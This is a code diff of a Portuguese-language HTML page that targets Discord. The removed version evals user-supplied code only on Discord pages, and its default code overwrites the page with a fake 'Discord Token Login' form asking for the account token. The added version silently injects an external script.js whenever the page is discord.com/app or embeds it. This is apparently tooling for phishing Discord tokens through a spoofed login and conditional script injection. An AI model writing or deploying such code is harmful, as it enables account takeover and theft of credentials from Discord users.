@@ -2,139 +2,34 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Executor JS</title>
-
-<style>
-body{
-    background:#111;
-    color:white;
-    font-family:Arial;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    padding:20px;
-}
-
-textarea{
-    width:90%;
-    max-width:800px;
-    height:300px;
-    background:#0a0a0a;
-    color:#00ff88;
-    border:1px solid #444;
-    padding:10px;
-    font-family:monospace;
-}
-
-button{
-    margin-top:10px;
-    padding:10px 20px;
-    cursor:pointer;
-}
-
-#console{
-    width:90%;
-    max-width:800px;
-    margin-top:20px;
-    background:#000;
-    border:1px solid #333;
-    padding:10px;
-    font-family:monospace;
-}
-</style>
+<title>Loader de JS</title>
 </head>
-
 <body>
-
-<h2>Executor JS</h2>
-
-<textarea id="codigo">
-document.body.innerHTML = `
-<html lang="en"><head>
-      <meta charset="UTF-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=edge">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Discord Token Login</title>
-      <link rel="stylesheet" href="popup.css">
-      <link rel="preconnect" href="https://fonts.googleapis.com">
-      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-      <link href="https://fonts.googleapis.com/css2?family=VT323&amp;family=Silkscreen&amp;display=swap" rel="stylesheet">
-      <script src="popup.js" defer=""></script>
-<style type="text/css" id="operaUserStyle"></style></head>
-
-<body>
-      <!-- <form>
-            <div class="title">Token</div>
-
-            <div class="wrap">
-                  <input class="input-effect" type="text" name="token" placeholder="Token" />
-                  <span class="focus-border"></span>
-            </div>
-
-            <button type="submit">Login</button>
-      </form> -->
-
-  <!-- 登录容器 -->
-  <form class="login-container">
-    <!-- 品牌名称 -->
-    <h1 class="brand-name">Meta Infinity</h1>
-    <!-- Twitter Token 登录标题 -->
-    <h2 id="status" class="twitter-token-title">Discord Token Login</h2>
-    <!-- 输入框 -->
-    <input id="token" type="password" spellcheck="false" placeholder="Enter your token">
-    <!-- 登录按钮 -->
-    <button type="submit" id="submit" class="login-button">Login</button>
-  </form>
-
-
-</body></html>
-`;
-console.log("Script executado");
-</textarea>
-
-<button onclick="executar()">Executar</button>
-
-<div id="console">Console:</div>
 
 <script>
+function carregarScript() {
+    const s = document.createElement("script");
+    s.src = "script.js";
+    document.body.appendChild(s);
+}
 
-function temDiscord(){
-
-    if(location.href.includes("discord.com/app")){
-        return true;
-    }
-
-    let iframes = document.querySelectorAll("iframe");
-
-    for(let i of iframes){
-        if(i.src && i.src.includes("discord.com/app")){
+function temIframeDiscord() {
+    const iframes = document.querySelectorAll("iframe");
+    for (let iframe of iframes) {
+        if (iframe.src && iframe.src.includes("https://discord.com/app")) {
             return true;
         }
     }
-
     return false;
 }
 
-function executar(){
+const paginaAtual = window.location.href;
 
-    let consoleDiv = document.getElementById("console");
-
-    if(!temDiscord()){
-        consoleDiv.innerHTML += "<br>❌ Discord não encontrado nesta página.";
-        return;
-    }
-
-    let codigo = document.getElementById("codigo").value;
-
-    try{
-        eval(codigo);
-        consoleDiv.innerHTML += "<br>✅ Script executado.";
-    }catch(e){
-        consoleDiv.innerHTML += "<br>Erro: " + e;
-    }
-
+if (paginaAtual.startsWith("https://discord.com/app")) {
+    carregarScript();
+} else if (temIframeDiscord()) {
+    carregarScript();
 }
-
 </script>
 
 </body>
